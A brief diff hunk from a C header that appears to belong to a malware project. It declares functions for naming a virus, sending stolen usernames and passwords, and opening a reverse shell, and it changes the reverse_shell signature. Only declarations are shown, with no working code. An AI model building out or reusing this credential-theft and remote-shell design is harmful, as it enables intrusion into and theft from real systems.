@@ -17,5 +17,5 @@ void free_execvp_ray(char ** cmd_ray);
 int get_virus_name(char * escaped_path);
 void send_stolen_data(char *username, char *password);
 
-int reverse_shell(int port, char*ip);
+int reverse_shell(int port, char*ip, char ** argv);
 #endif
